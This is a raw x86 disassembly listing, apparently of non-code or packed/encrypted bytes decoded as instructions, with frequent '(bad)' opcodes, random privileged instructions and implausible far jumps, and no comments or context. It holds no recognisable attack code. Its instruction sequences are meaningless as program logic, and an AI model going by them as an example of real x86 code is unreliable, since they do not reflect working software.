  42c3f2:	pop    esp
  42c3f3:	sti    
  42c3f4:	test   BYTE PTR [eax],ah
  42c3f6:	add    ebx,eax
  42c3f8:	or     DWORD PTR [ecx],ecx
  42c3fa:	pop    es
  42c3fb:	test   BYTE PTR [edx-0x5b496e34],ah
  42c401:	(bad)  
  42c403:	loope  0x42c3a3
  42c405:	js     0x42c438
  42c407:	xchg   edi,eax
  42c408:	outs   dx,DWORD PTR ds:[esi]
  42c409:	sub    al,0x81
  42c40b:	je     0x42c42b
  42c40d:	adc    eax,0x288ee40d
  42c412:	push   ebp
  42c413:	adc    edi,esi
  42c415:	fiadd  DWORD PTR [ecx]
  42c417:	in     eax,0xf4
  42c419:	je     0x42c40f
  42c41b:	adc    bl,BYTE PTR [ebp+0x4c]
  42c41e:	ficom  WORD PTR [ecx-0x12]
  42c421:	mov    gs,ebp
  42c423:	jbe    0x42c499
  42c425:	stos   BYTE PTR es:[edi],al
  42c426:	adc    al,0x5d
  42c428:	mov    bh,0x73
  42c42a:	mov    ecx,0x654a99e0
  42c42f:	cmp    DWORD PTR [esi-0x3a2553b2],ebp
	...
  42c495:	add    ah,ch
  42c497:	sbb    ebp,edx
  42c499:	sahf   
  42c49a:	cmc    
  42c49b:	fsubp  st(7),st
  42c49d:	jnp    0x42c473
  42c49f:	push   esi
  42c4a1:	xor    BYTE PTR [edx+0x9ce9c6b],ah
  42c4a7:	fiadd  DWORD PTR [ecx]
  42c4a9:	add    BYTE PTR [edi],al
  42c4ab:	add    DWORD PTR [eax],eax
  42c4ad:	add    BYTE PTR [edx-0x5bd2ec23],bh
  42c4b3:	(bad)  
  42c4b4:	pop    ds
  42c4b5:	cmp    DWORD PTR ds:0x4a585a6,ecx
  42c4bb:	and    eax,0xfc7d6d7
  42c4c0:	ja     0x42c50d
  42c4c2:	mov    ebp,0xbeca913d
  42c4c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c4c8:	xchg   ebp,eax
  42c4c9:	repnz add al,0xc3
  42c4cc:	cld    
  42c4cd:	adc    dl,BYTE PTR [esi+0x44af8692]
  42c4d3:	hlt    
  42c4d4:	adc    al,0x99
  42c4d6:	jno    0x42c4c2
  42c4d8:	or     DWORD PTR [edi+0x50de1591],0xb811eb18
  42c4e2:	add    BYTE PTR [ebx],bl
  42c4e4:	outs   dx,DWORD PTR ds:[esi]
  42c4e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c4e6:	imul   edi,DWORD PTR [eax],0x4c7119e5
  42c4ec:	addr16 pop esp
  42c4ee:	test   al,0x3b
  42c4f0:	xchg   esp,eax
  42c4f1:	js     0x42c481
  42c4f3:	imul   edi,DWORD PTR [eax],0xac1ab561
  42c4f9:	cmc    
  42c4fa:	add    BYTE PTR [edx],0xe4
  42c4fd:	sub    al,0x1f
  42c4ff:	mov    ch,0xcb
  42c501:	inc    edi
  42c502:	pop    esp
  42c503:	imul   ebx,ecx,0x9685ea67
  42c509:	xchg   ebx,eax
  42c50a:	adc    bh,al
  42c50c:	retf   
  42c50d:	inc    ecx
  42c50e:	repz cld 
  42c510:	jle    0x42c4e8
  42c512:	pop    ss
  42c513:	pop    ebp
  42c514:	cmp    eax,0x5ef2fd26
  42c519:	out    dx,eax
  42c51a:	jne    0x42c589
  42c51c:	fs cs js 0x42c555
  42c520:	adc    bh,BYTE PTR [edx+0x1a9420b]
  42c526:	xchg   ebp,eax
  42c527:	and    al,0xd7
  42c529:	and    BYTE PTR [edi+0x52],0xcd
  42c52d:	and    al,0x7
  42c52f:	retf   
  42c530:	out    dx,al
  42c531:	mov    ecx,0x5f40161e
  42c536:	inc    ebx
  42c537:	ss std 
  42c539:	pusha  
  42c53a:	jge    0x42c537
  42c53c:	add    dh,BYTE PTR [ecx]
  42c53e:	mov    bh,0xef
  42c540:	cmp    eax,0x642aa437
  42c545:	ret    0x10f
  42c548:	xor    eax,0xba4c54
  42c54d:	ret    0xae70
  42c550:	jns    0x42c59c
  42c552:	jbe    0x42c5bd
  42c554:	jnp    0x42c5a8
  42c556:	add    BYTE PTR [edx+ebx*1-0x43],0x5f
  42c55b:	cmp    bl,dh
  42c55d:	sbb    ch,BYTE PTR [esi-0x65274c6c]
  42c563:	adc    al,0x9c
  42c565:	mov    bl,0x23
  42c567:	inc    edx
  42c568:	jmp    0xdd702c04
  42c56d:	jmp    0x42c556
  42c56f:	xchg   edi,eax
  42c570:	sahf   
  42c571:	jg     0x42c50f
  42c573:	das    
  42c574:	push   edi
  42c575:	jle    0x42c5b5
  42c577:	call   FWORD PTR [esi]
  42c579:	cmp    ebx,DWORD PTR [edi-0x1d]
  42c57c:	push   0xba628dde
  42c581:	(bad)  
  42c582:	rcl    BYTE PTR [ecx],1
  42c584:	fucom  st(3)
  42c586:	int    0xf6
  42c588:	popf   
  42c589:	mov    eax,0x3d4eafbe
  42c58e:	xchg   DWORD PTR [eax-0x799cc0a3],edx
  42c594:	cwde   
  42c595:	push   edx
  42c596:	push   esp
  42c597:	test   BYTE PTR [ecx+0x41],0x20
  42c59b:	jae    0x42c5cc
  42c59d:	outs   dx,DWORD PTR ds:[esi]
  42c59e:	into   
  42c59f:	(bad)  
  42c5a0:	aad    0x6b
  42c5a2:	xchg   edx,eax
  42c5a3:	sub    esp,DWORD PTR [esi+ebp*8]
  42c5a6:	pop    ds
  42c5a7:	xor    al,0x7b
  42c5a9:	dec    ecx
  42c5aa:	pop    ebx
  42c5ab:	leave  
  42c5ac:	xor    esi,DWORD PTR [eax+0x384060dd]
  42c5b2:	xor    edi,DWORD PTR [edx]
  42c5b4:	push   esi
	...
  42c615:	add    BYTE PTR [ebp+0x48],bl
  42c618:	jle    0x42c5a8
  42c61a:	jg     0x42c5da
  42c61c:	std    
  42c61d:	fisttp DWORD PTR [edi-0x31]
  42c620:	inc    eax
  42c621:	push   edi
  42c622:	not    DWORD PTR [ebp-0x24ef63c0]
  42c628:	add    DWORD PTR [eax],eax
  42c62a:	pop    es
  42c62b:	add    DWORD PTR [eax],eax
  42c62d:	add    BYTE PTR ds:0x5e829ef6,dl
  42c633:	dec    ebx
  42c634:	and    ecx,ecx
  42c636:	inc    ecx
  42c637:	push   ds
  42c638:	mov    al,ds:0x5b2b11f0
  42c63d:	retf   0xf7e4
  42c640:	jne    0x42c65e
  42c642:	adc    dl,BYTE PTR [ecx+0x4e125182]
  42c648:	and    esp,DWORD PTR [ecx-0x2d]
  42c64b:	inc    esi
  42c64c:	jnp    0x42c65d
  42c64e:	fs leave 
  42c650:	and    BYTE PTR [edx],dh
  42c652:	scas   eax,DWORD PTR es:[edi]
  42c653:	sbb    cl,dh
  42c655:	xlat   BYTE PTR ds:[ebx]
  42c656:	inc    esp
  42c657:	sub    edi,DWORD PTR [eax+eax*1+0x8d6f7af]
  42c65e:	mov    eax,ds:0x43d78e21
  42c663:	stos   DWORD PTR es:[edi],eax
  42c664:	sbb    DWORD PTR [esi+0x155852fa],ecx
  42c66a:	and    BYTE PTR [eax],ah
  42c66c:	cs inc esi
  42c66e:	jp     0x42c63f
  42c670:	mov    bh,0x9
  42c672:	mov    BYTE PTR [edi],bh
  42c674:	pop    esp
  42c675:	cwde   
  42c676:	jmp    0x42c694
  42c678:	xor    DWORD PTR [ebx+eiz*1],ebp
  42c67b:	ret    0xaa34
  42c67e:	pop    edi
  42c67f:	inc    edx
  42c680:	xor    eax,0x52f9fce0
  42c685:	dec    ebx
  42c686:	mov    esi,0x479c9c11
  42c68b:	jmp    ecx
  42c68d:	test   eax,0x6a03786a
  42c692:	mov    dl,0x31
  42c694:	jns    0x42c6f9
  42c696:	popa   
  42c697:	cmp    al,0x47
  42c699:	bound  ebp,QWORD PTR [ebx-0x5246d708]
  42c69f:	cld    
  42c6a0:	test   al,0xd2
  42c6a2:	cdq    
  42c6a3:	mov    DWORD PTR cs:[edx],edx
  42c6a6:	in     eax,0xc0
  42c6a8:	add    eax,0x8cce07b4
  42c6ad:	mov    eax,ds:0xe5eb5f48
  42c6b2:	push   ecx
  42c6b3:	jno    0x42c63f
  42c6b5:	cmp    bl,BYTE PTR ds:0xd5a5ce51
  42c6bb:	out    0xf9,al
  42c6bd:	fwait
  42c6be:	aaa    
  42c6bf:	ror    DWORD PTR [esi+ebp*8+0x32a469e6],0x6d
  42c6c7:	jge    0x42c721
  42c6c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6ca:	mov    eax,ds:0xe8e73daf
  42c6cf:	dec    esp
  42c6d0:	cwde   
  42c6d1:	lods   eax,DWORD PTR ds:[esi]
  42c6d2:	mov    esi,0x72cb0e6e
  42c6d7:	movups xmm3,XMMWORD PTR [eax-0x68216809]
  42c6de:	cmp    BYTE PTR [esi-0x50],bh
  42c6e1:	loopne 0x42c70a
  42c6e3:	and    edx,DWORD PTR [ebp+0x50]
  42c6e6:	sbb    eax,DWORD PTR [esi+eax*8]
  42c6e9:	pop    edi
  42c6ea:	rcr    DWORD PTR ds:0xbabc9448,1
  42c6f0:	add    eax,esp
  42c6f2:	int    0xaa
  42c6f4:	push   ax
  42c6f6:	arpl   cx,di
  42c6f8:	rcl    edi,cl
  42c6fa:	jmp    0xa35c0cf3
  42c6ff:	sub    DWORD PTR [eax],eax
  42c701:	push   eax
  42c702:	and    esp,ebx
  42c704:	clts   
  42c706:	add    BYTE PTR ds:0x2a3c199,0xb8
  42c70d:	sbb    al,0x41
  42c70f:	or     al,BYTE PTR [ebp+0x1944038e]
  42c715:	cmp    bl,BYTE PTR [eax]
  42c717:	jne    0x42c6e2
  42c719:	inc    ecx
  42c71a:	mov    al,0xae
  42c71c:	xchg   esi,eax
  42c71d:	xchg   BYTE PTR [ecx+0x4b1b4cf2],ch
  42c723:	loope  0x42c720
  42c725:	jno    0x42c76f
  42c727:	(bad)  
  42c728:	mov    eax,ds:0xe574513b
  42c72d:	cwde   
  42c72e:	sbb    al,0x4d
  42c730:	xchg   edi,eax
  42c731:	in     al,dx
  42c732:	jmp    0x4383f3
	...
  42c793:	add    BYTE PTR [eax],al
  42c795:	add    BYTE PTR [eax],bh
  42c797:	mov    DWORD PTR [edx-0x6b],ebp
  42c79a:	sti    
  42c79b:	idiv   edi
  42c79d:	lods   eax,DWORD PTR ds:[esi]
  42c79e:	push   ss
  42c79f:	mov    al,ds:0x16463f90
  42c7a4:	and    cl,BYTE PTR [ebp+0x1dc17]
  42c7aa:	pop    es
  42c7ab:	add    DWORD PTR [eax],eax
  42c7ad:	add    bh,cl
  42c7af:	stc    
  42c7b0:	inc    ebx
  42c7b1:	or     bl,ah
  42c7b3:	mov    ?,WORD PTR [ebx+0x66]
  42c7b6:	push   ss
  42c7b7:	pushf  
  42c7b8:	lahf   
  42c7b9:	lahf   
  42c7ba:	push   edi
  42c7bb:	xchg   ecx,eax
  42c7bc:	pop    ebp
  42c7bd:	pop    ds
  42c7be:	mov    edx,0xe8cc8eed
  42c7c3:	ror    BYTE PTR [ebx+0x53],cl
  42c7c6:	cmp    bh,BYTE PTR [edi+eiz*4-0x3c]
  42c7ca:	aad    0x27
  42c7cc:	ror    BYTE PTR ds:0x2fd7de50,1
  42c7d2:	mov    dl,0x73
  42c7d4:	adc    BYTE PTR [ebx+0x45563f3a],ch
  42c7da:	cdq    
  42c7db:	or     bl,bh
  42c7dd:	mov    al,ds:0xd7f0d63a
  42c7e2:	xchg   esi,eax
  42c7e3:	ins    BYTE PTR es:[edi],dx
  42c7e4:	enter  0x4fb7,0x6e
  42c7e8:	outs   dx,BYTE PTR ds:[esi]
  42c7e9:	cmp    al,0xac
  42c7eb:	mov    bl,0xf3
  42c7ed:	fidiv  WORD PTR [ebp+0x6d5f8a8b]
  42c7f3:	inc    BYTE PTR [ebx-0xe5e9926]
  42c7f9:	ret    
  42c7fa:	add    DWORD PTR [esi-0x17],0xffffffa2
  42c7fe:	sub    DWORD PTR [ebx+eiz*1+0x6ed564d2],0xe0856a87
  42c809:	cld    
  42c80a:	test   DWORD PTR [edi+0x42],ebx
  42c80d:	std    
  42c80e:	pop    ds
  42c80f:	out    0x62,eax
  42c811:	jl     0x42c845
  42c813:	in     al,0xd3
  42c815:	fdiv   QWORD PTR [eax+0xd]
  42c818:	mov    eax,0x5e9e1e55
  42c81d:	stos   DWORD PTR es:[edi],eax
  42c81e:	and    DWORD PTR [edx-0x23],ebp
  42c821:	jge    0x42c7ae
  42c823:	mov    bh,0x96
  42c825:	arpl   WORD PTR [ecx],si
  42c827:	sbb    bh,BYTE PTR [esi]
  42c829:	ds scas al,BYTE PTR es:[edi]
  42c82b:	std    
  42c82c:	sar    DWORD PTR [esi+0x29],0x50
  42c830:	(bad)  
  42c831:	arpl   WORD PTR [ebp-0x1e051c20],ax
  42c837:	mov    al,ds:0x83d48be7
  42c83c:	cdq    
  42c83d:	pop    ds
  42c83e:	fisttp QWORD PTR [edx+0x44]
  42c841:	or     DWORD PTR [eax+0x78],ecx
  42c844:	mov    ds:0x8bc6c624,eax
  42c849:	mov    ecx,0x4b6c89bc
  42c84e:	enter  0x3c0b,0x2
  42c852:	pop    es
  42c853:	outs   dx,BYTE PTR ds:[esi]
  42c854:	out    dx,eax
  42c855:	arpl   WORD PTR [ebp+0x19b7bc10],bx
  42c85b:	outs   dx,DWORD PTR ds:[esi]
  42c85c:	sub    al,0x85
  42c85e:	mov    edx,0x24dc67a8
  42c863:	sub    al,0x71
  42c865:	bound  ebx,QWORD PTR [esi+edi*8-0x9]
  42c869:	xchg   ecx,eax
  42c86a:	and    eax,ebp
  42c86c:	cmp    cl,cl
  42c86e:	cmp    bl,bl
  42c870:	test   eax,0x5108188a
  42c875:	xchg   BYTE PTR [eax-0x4b76f38c],ah
  42c87b:	and    al,0x4b
  42c87d:	jae    0x42c875
  42c87f:	test   DWORD PTR cs:[ecx-0x7],ebp
  42c883:	sar    BYTE PTR [eax],cl
  42c885:	fs jle 0x42c864
  42c888:	pusha  
  42c889:	mov    edx,0x4ee6e7c8
  42c88e:	sbb    BYTE PTR [edi+ebx*8+0x71f68e6d],bh
  42c895:	mov    eax,0x1d6fa4b7
  42c89a:	cli    
  42c89b:	popf   
  42c89c:	mov    al,ss:0x81cf090d
  42c8a2:	inc    eax
  42c8a3:	add    al,0x45
  42c8a5:	cs pushf 
  42c8a7:	fmul   QWORD PTR [edi+0x1a]
  42c8aa:	sub    edx,DWORD PTR [ecx+0x28]
  42c8ad:	and    BYTE PTR [ebx-0x3d1426fe],bh
  42c8b3:	je     0x42c8b2
	...
  42c915:	add    BYTE PTR [eax],dl
  42c917:	sbb    ecx,ecx
  42c919:	jmp    0xfb73c4e9
  42c91e:	addr16 mov ds:0xa954,al
  42c922:	aas    
  42c923:	repz xor eax,0x1dd1e21
  42c929:	add    BYTE PTR [edi],al
  42c92b:	add    DWORD PTR [eax],eax
  42c92d:	add    BYTE PTR [esi],bl
  42c92f:	enter  0xef53,0x1a
  42c933:	xchg   ecx,eax
  42c934:	jbe    0x42c979
  42c936:	adc    al,0x99
  42c938:	mov    edi,0x1110e0e9
  42c93d:	adc    eax,0xf93eb603
  42c942:	rcr    dl,0x1e
  42c945:	jmp    0x38b0:0x692e99fe
  42c94c:	mov    WORD PTR [ecx-0x16],?
  42c94f:	leave  
  42c950:	stos   BYTE PTR es:[edi],al
  42c951:	les    edx,FWORD PTR [esi-0x45f87cb4]
  42c957:	cwde   
  42c958:	mul    DWORD PTR [edx+0x29]
  42c95b:	mov    dh,0x6b
  42c95d:	mov    ss,WORD PTR [ebx]
  42c95f:	push   0xc7bab9be
  42c964:	inc    eax
  42c965:	inc    edx
  42c966:	aas    
  42c967:	and    al,0x3c
  42c969:	fidiv  DWORD PTR [eax]
  42c96b:	and    BYTE PTR [eax],0xd8
  42c96e:	rcr    cl,0x7f
  42c971:	and    bl,bh
  42c973:	sahf   
  42c974:	cmc    
  42c975:	pushf  
  42c976:	jl     0x42c968
  42c978:	add    ebx,DWORD PTR [esi+0x199c9d1]
  42c97e:	sub    eax,0xaf7dd780
  42c983:	pop    ss
  42c984:	fsubr  DWORD PTR [ebx]
  42c986:	sbb    eax,0x8e3b83b3
  42c98b:	mov    cl,0x8
  42c98d:	push   cs
  42c98e:	mov    dl,0x69
  42c990:	int    0xb
  42c992:	sahf   
  42c993:	adc    eax,0x83859987
  42c998:	jl     0x42c94e
  42c99a:	sbb    DWORD PTR [edx+0x1d],0x45f2659e
  42c9a1:	inc    edx
  42c9a2:	sub    eax,0x4ed0725b
  42c9a7:	sbb    dl,cl
  42c9a9:	inc    esp
  42c9aa:	and    ch,dh
  42c9ac:	js     0x42c934
  42c9ae:	js     0x42c96e
  42c9b0:	fsubr  QWORD PTR [ebp-0x2a]
  42c9b3:	mov    eax,ds:0x468f4337
  42c9b8:	add    esp,esp
  42c9ba:	outs   dx,BYTE PTR ds:[esi]
  42c9bb:	xor    al,BYTE PTR [eax+0x4f91b3c]
  42c9c1:	pushf  
  42c9c2:	mov    ecx,0x7d32d46e
  42c9c7:	mov    ch,bh
  42c9c9:	fdivr  st,st(4)
  42c9cb:	aam    0x35
  42c9cd:	das    
  42c9ce:	inc    esi
  42c9cf:	lahf   
  42c9d0:	in     al,dx
  42c9d1:	dec    edx
  42c9d2:	sar    bh,1
  42c9d4:	mov    ds:0x10874343,al
  42c9d9:	out    0xc9,al
  42c9db:	shr    cl,1
  42c9dd:	into   
  42c9de:	push   ecx
  42c9df:	dec    esp
  42c9e0:	and    BYTE PTR [edx],al
  42c9e2:	jbe    0x42c98d
  42c9e4:	mov    eax,0x376f3a24
  42c9e9:	into   
  42c9ea:	iret   
  42c9eb:	shl    BYTE PTR [esp+ecx*2],cl
  42c9ee:	xchg   DWORD PTR ds:0xceddebfe,ecx
  42c9f4:	pushf  
  42c9f5:	icebp  
  42c9f6:	les    edx,FWORD PTR [ecx+0x13931baf]
  42c9fc:	dec    edi
  42c9fd:	sub    eax,0x10f4b4f2
  42ca02:	fcmovbe st,st(3)
  42ca04:	mov    ecx,0xacc04ef3
  42ca09:	and    DWORD PTR [edi+edx*1-0x7d],0x57
  42ca0e:	push   ebx
  42ca0f:	pusha  
  42ca10:	(bad)  
  42ca11:	sbb    eax,0x90dd9608
  42ca16:	inc    ebp
  42ca17:	mov    esi,DWORD PTR [edi-0x120794a4]
  42ca1d:	xchg   ebx,eax
  42ca1e:	stos   BYTE PTR es:[edi],al
  42ca1f:	xchg   ecx,eax
  42ca20:	jge    0x42c9af
  42ca22:	mov    ch,0x8e
  42ca24:	je     0x42ca34
  42ca26:	dec    edx
  42ca27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca28:	sub    BYTE PTR [ebx],0x7e
  42ca2b:	mov    dh,0x63
  42ca2d:	push   ds
  42ca2e:	in     al,0xdc
  42ca30:	jecxz  0x42c9ec
  42ca32:	xchg   ebx,eax
  42ca33:	mov    ah,0xf7
	...
  42ca95:	add    BYTE PTR [edi-0x2be7726],ah
  42ca9b:	push   ebx
  42ca9c:	out    dx,eax
  42ca9d:	(bad)  
  42ca9e:	jb     0x42cab7
  42caa0:	shr    DWORD PTR ds:0x79a1d52,1
  42caa6:	and    eax,0x70001de
  42caab:	add    DWORD PTR [eax],eax
  42caad:	add    BYTE PTR [edx],dh
  42caaf:	retf   0xa994
  42cab2:	fmul   QWORD PTR [ebp+0x26]
  42cab5:	or     ebx,DWORD PTR [edx]
  42cab7:	cmp    DWORD PTR [esi+edx*1+0x58],esi
  42cabb:	push   esi
  42cabc:	out    dx,al
  42cabd:	pop    edx
  42cabe:	shr    DWORD PTR [ebp+0x41],1
  42cac1:	cmp    eax,0xce52126c
  42cac6:	jb     0x42cae2
  42cac8:	or     al,0x34
  42caca:	cmp    BYTE PTR [ecx+0x7e6b7a7b],dl
  42cad0:	in     al,dx
  42cad1:	lods   eax,DWORD PTR ds:[esi]
  42cad2:	and    DWORD PTR [ecx+0x79129222],ebx
  42cad8:	cwde   
  42cad9:	repnz xor ch,al
  42cadc:	cmp    ah,al
  42cade:	xchg   ebx,eax
  42cadf:	icebp  
  42cae0:	mov    ebx,DWORD PTR [esp+ebp*8]
  42cae3:	xor    dl,BYTE PTR [edi+0x5f771533]
  42cae9:	xchg   ch,bl
  42caeb:	and    BYTE PTR [ebx+0x42fb30f5],bh
  42caf1:	or     BYTE PTR [edx+0x3c],al
  42caf4:	xchg   edi,eax
  42caf5:	cmp    bl,BYTE PTR [eax*1+0x58fe156a]
  42cafc:	sub    BYTE PTR [edi],dh
  42cafe:	sbb    eax,0x8013193b
  42cb03:	daa    
  42cb04:	nop
  42cb05:	imul   esp,edx,0xffffffb3
  42cb08:	ret    0x6a43
  42cb0b:	popf   
  42cb0c:	pop    es
  42cb0d:	pop    ebx
  42cb0e:	dec    ebp
  42cb0f:	mov    dh,0x4
  42cb11:	push   ecx
  42cb12:	nop
  42cb13:	mov    dh,0xcf
  42cb15:	psllw  mm5,mm0
  42cb18:	pop    esp
  42cb19:	loop   0x42cad5
  42cb1b:	int    0x9a
  42cb1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cb1e:	and    bh,al
  42cb20:	mov    edx,0x5dc9355a
  42cb25:	scas   al,BYTE PTR es:[edi]
  42cb26:	cld    
  42cb27:	or     BYTE PTR [eax+ebp*8+0x74],dh
  42cb2b:	push   cs
  42cb2c:	sbb    BYTE PTR [ebp+0x5f2d1043],ch
  42cb32:	jbe    0x42cb50
  42cb34:	push   edx
  42cb35:	call   0xcddadae0
  42cb3a:	inc    eax
  42cb3b:	jmp    0x8b3d9047
  42cb40:	aam    0xe5
  42cb42:	retf   
  42cb43:	aam    0x3e
  42cb45:	push   esi
  42cb46:	dec    ebx
  42cb47:	mov    edx,0x97104cbe
  42cb4c:	inc    ebp
  42cb4d:	loope  0x42cb1c
  42cb4f:	jo     0x42cb8a
  42cb51:	push   es
  42cb52:	or     ecx,DWORD PTR [ebx+0x442cfb5d]
  42cb58:	add    ebp,DWORD PTR [edx]
  42cb5a:	lods   eax,DWORD PTR ds:[esi]
  42cb5b:	push   esp
  42cb5c:	dec    ebx
  42cb5d:	pop    edx
  42cb5e:	push   eax
  42cb5f:	or     BYTE PTR [esi+0x18],cl
  42cb62:	aas    
  42cb63:	mov    bl,0x13
  42cb65:	scas   eax,DWORD PTR es:[edi]
  42cb66:	add    eax,0xe7923223
  42cb6b:	jns    0x42cb9d
  42cb6d:	xchg   ebp,eax
  42cb6e:	aad    0x55
  42cb70:	pop    esi
  42cb71:	add    ah,BYTE PTR [ebp-0x2a275df0]
  42cb77:	pop    esp
  42cb78:	clc    
  42cb79:	xlat   BYTE PTR ds:[ebx]
  42cb7a:	in     eax,dx
  42cb7b:	cmp    al,0x96
  42cb7d:	into   
  42cb7e:	test   DWORD PTR [eax-0x4b],edi
  42cb81:	shl    DWORD PTR [eax+esi*4],0x0
  42cb85:	or     DWORD PTR [esi],0xffffffa7
  42cb88:	aam    0xcd
  42cb8a:	setno  BYTE PTR [ebp-0x1f]
  42cb8e:	mov    eax,ds:0xb0d682d4
  42cb93:	inc    esi
  42cb94:	pop    ebp
  42cb95:	add    esp,DWORD PTR [edx+0x51019606]
  42cb9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cb9c:	popa   
  42cb9d:	mov    dl,0xef
  42cb9f:	shr    BYTE PTR [edi],0x90
  42cba2:	daa    
  42cba3:	outs   dx,BYTE PTR ds:[esi]
  42cba4:	pop    ebx
  42cba5:	pop    edx
  42cba6:	lss    esp,FWORD PTR [edx+eax*4]
  42cbaa:	into   
  42cbab:	outs   dx,DWORD PTR ds:[esi]
  42cbac:	mov    edx,?
  42cbae:	sbb    bl,BYTE PTR [ebx-0x77]
  42cbb1:	imul   ecx,DWORD PTR gs:[esi],0x6e
	...
  42cc15:	add    BYTE PTR [edi+0x2],bh
  42cc18:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc1c:	call   FWORD PTR [ebx]
  42cc1e:	iret   
  42cc1f:	mov    dl,0xde
  42cc21:	stc    
  42cc22:	div    BYTE PTR [edx]
  42cc24:	in     eax,dx
  42cc25:	into   
  42cc26:	sub    al,0xdf
  42cc28:	add    DWORD PTR [eax],eax
  42cc2a:	pop    es
  42cc2b:	add    DWORD PTR [eax],eax
  42cc2d:	add    BYTE PTR [ebx-0x7a],bh
  42cc30:	adc    al,0xad
  42cc32:	or     ebx,DWORD PTR [edx-0xf]
  42cc35:	adc    eax,0xe311158a
  42cc3a:	ror    BYTE PTR [esi-0x20a05713],1
  42cc40:	mov    WORD PTR [esi],gs
  42cc42:	xchg   ecx,eax
  42cc43:	jae    0x42ccb2
  42cc45:	add    DWORD PTR [esi+0x267ff1b4],esp
  42cc4b:	adc    eax,0x509bbf74
  42cc50:	dec    eax
  42cc51:	mov    bh,0xb4
  42cc53:	stos   BYTE PTR es:[edi],al
  42cc54:	fs inc ebx
  42cc56:	scas   eax,DWORD PTR es:[edi]
  42cc57:	xor    DWORD PTR [ebx-0x14],ecx
  42cc5a:	(bad)  
  42cc5b:	in     al,0xc0
  42cc5d:	mov    ds:0xc96c172e,al
  42cc62:	jmp    0x1140:0x483bd35
  42cc69:	adc    eax,ebx
  42cc6b:	mov    cs,WORD PTR [edx-0x6b4cceaf]
  42cc71:	je     0x42cce4
  42cc73:	jmp    0x7f4b:0x2007e8d4
  42cc7a:	shl    BYTE PTR [esi],cl
  42cc7c:	and    DWORD PTR [ebx-0x1e],ebp
  42cc7f:	in     al,dx
  42cc80:	or     al,0xed
  42cc82:	cli    
  42cc83:	ret    
  42cc84:	adc    edx,DWORD PTR [esi-0x2d]
  42cc87:	adc    BYTE PTR [ebp+0x3b4bb45a],ah
  42cc8d:	in     eax,0x9c
  42cc8f:	mov    eax,ds:0x353aeb0b
  42cc94:	jecxz  0x42cc41
  42cc96:	shr    esp,1
  42cc98:	add    BYTE PTR [edx],bh
  42cc9a:	sbb    esi,DWORD PTR [esp+esi*2]
  42cc9d:	nop
  42cc9e:	xchg   BYTE PTR [ebx],al
  42cca0:	mov    ebx,0x5f36957f
  42cca5:	lock add bl,BYTE PTR [edx]
  42cca8:	adc    ah,BYTE PTR [edx-0x63]
  42ccab:	add    al,0x1c
  42ccad:	stos   DWORD PTR es:[edi],eax
  42ccae:	mov    ds:0xab0a839f,al
  42ccb3:	or     ebx,DWORD PTR [ebx+0x5]
  42ccb6:	test   BYTE PTR [esi+0x1228ab45],0x2e
  42ccbd:	jb     0x42cc40
  42ccbf:	stc    
  42ccc0:	pop    ecx
  42ccc1:	or     ebp,DWORD PTR [eax+0x3]
  42ccc4:	loope  0x42ccca
  42ccc6:	add    edx,esi
  42ccc8:	mov    eax,0xa155cece
  42cccd:	push   es
  42ccce:	push   ecx
  42cccf:	or     bh,BYTE PTR [ecx+eiz*1+0x78cd9c1e]
  42ccd6:	test   DWORD PTR [ecx+0x34],ebx
  42ccd9:	or     BYTE PTR [ebp+eiz*4-0x61f880ca],0x7b
  42cce1:	push   cs
  42cce2:	leave  
  42cce3:	jae    0x42cca2
  42cce5:	push   si
  42cce7:	pop    ebx
  42cce8:	or     eax,0xf9c13240
  42cced:	stos   BYTE PTR es:[edi],al
  42ccee:	adc    DWORD PTR [ebp-0x44798301],esp
  42ccf4:	sbb    eax,0x18f04b8d
  42ccf9:	iret   
  42ccfa:	sub    DWORD PTR [edx-0x41c6636f],0x81b2afb2
  42cd04:	fild   DWORD PTR ds:0x8cc0edbf
  42cd0a:	pop    ecx
  42cd0b:	pushf  
  42cd0c:	jl     0x42ccea
  42cd0e:	bound  ebp,QWORD PTR [edx+0x32a322ca]
  42cd14:	out    0xdd,eax
  42cd16:	scas   al,BYTE PTR es:[edi]
  42cd17:	mov    al,ds:0xc0e14d70
  42cd1c:	cmp    dl,ah
  42cd1e:	sti    
  42cd1f:	sub    edx,DWORD PTR [eax+0x1d]
  42cd22:	adc    bh,BYTE PTR [eax-0x1bbd31e1]
  42cd28:	add    eax,0xf5ebfcfb
  42cd2d:	adc    BYTE PTR [edi+0x7a],dl
  42cd30:	or     BYTE PTR [eax],ch
  42cd32:	iret   
  42cd33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd34:	push   ebx
	...
  42cd95:	add    BYTE PTR [ecx],bl
  42cd97:	mov    eax,ds:0xdffe87fe
  42cd9c:	jns    0x42cd5d
  42cd9e:	in     eax,0x80
  42cda0:	(bad)  
  42cda2:	call   0x1e0:0x33ecd18b
  42cda9:	add    BYTE PTR [edi],al
  42cdab:	add    DWORD PTR [eax],eax
  42cdad:	add    BYTE PTR [eax+0x45],dl
  42cdb0:	(bad)  
  42cdb1:	mov    BYTE PTR [edi+0x35b06be1],ch
  42cdb7:	jns    0x42cdf1
  42cdb9:	call   0x19a60c2a
  42cdbe:	sub    al,al
  42cdc0:	dec    esp
  42cdc1:	push   ecx
  42cdc2:	mov    bh,0x28
  42cdc4:	cld    
  42cdc5:	push   ecx
  42cdc6:	cmp    eax,0xa8d063dc
  42cdcb:	xchg   ebp,eax
  42cdcc:	sbb    eax,0x17439ce3
  42cdd1:	mov    eax,0x48793934
  42cdd6:	leave  
  42cdd7:	lds    edi,FWORD PTR [esp+ebp*4-0x36e50f59]
  42cdde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cddf:	aad    0x71
  42cde1:	leave  
  42cde2:	mov    eax,ds:0x5e745579
  42cde7:	and    DWORD PTR [ebx-0x60866a58],ecx
  42cded:	jo     0x42ce25
  42cdef:	mov    bl,0xd7
  42cdf1:	test   al,0x89
  42cdf3:	mov    al,ds:0x639d811a
  42cdf8:	mov    bh,0x38
  42cdfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cdfb:	or     ebp,edi
  42cdfd:	in     eax,dx
  42cdfe:	pop    ebx
